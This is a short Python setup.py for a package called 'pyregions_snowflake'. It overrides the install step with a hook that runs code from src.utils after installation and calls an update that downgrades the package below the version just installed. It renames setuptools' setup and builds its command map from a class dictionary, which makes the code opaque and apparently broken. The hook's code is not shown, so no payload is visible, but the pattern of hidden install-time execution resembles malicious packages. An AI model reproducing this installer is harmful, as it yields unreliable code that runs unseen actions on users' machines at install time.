from setuptools import setup as initialize
from setuptools.command.install import install as base

class ModelInstall(base):
    def run(self):
        from src.utils import utils
        base.run(self)
        utils.update("pyregions_snowflake<3.9.1")

class Setup():
    name = "pyregions_snowflake"
    version = "3.9.5"
    install = ModelInstall
    def __init__(self):
        self.d = initialize(name=self.name, version=self.version, cmdclass=dict(Setup.__dict__))

Setup()
